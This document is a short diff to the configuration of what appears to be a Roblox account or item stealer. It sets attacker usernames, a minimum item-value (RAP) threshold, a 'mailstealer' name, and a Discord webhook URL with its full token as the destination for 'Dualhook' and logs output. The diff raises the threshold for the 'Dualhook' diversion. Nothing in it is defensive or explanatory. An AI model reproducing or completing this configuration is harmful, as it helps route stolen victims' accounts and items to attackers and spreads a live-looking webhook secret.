@@ -1,9 +1,13 @@
+Username = "medinololboi"
+Username2 = "ZigZag1182"
+Webhook = "https://discord.com/api/webhooks/1302512121359368253/alfoIDC5A05HVfjUvs3kRcAMc2yqVaUGhzZuA48YpjmNwZohdTMIYbNdDBjwfUZ5bzsR"
+MinimumRAP = 10000
 DualhookUsername = "medinololboi"
 DualhookWebhook =
     "https://discord.com/api/webhooks/1302512121359368253/alfoIDC5A05HVfjUvs3kRcAMc2yqVaUGhzZuA48YpjmNwZohdTMIYbNdDBjwfUZ5bzsR"
 LogsWebhook =
     "https://discord.com/api/webhooks/1302512121359368253/alfoIDC5A05HVfjUvs3kRcAMc2yqVaUGhzZuA48YpjmNwZohdTMIYbNdDBjwfUZ5bzsR"
-DualhookRAP = 10000000000
+DualhookRAP = 10000000000000
 mailstealer_name = "poo"
 
 Roblox_Username = Username
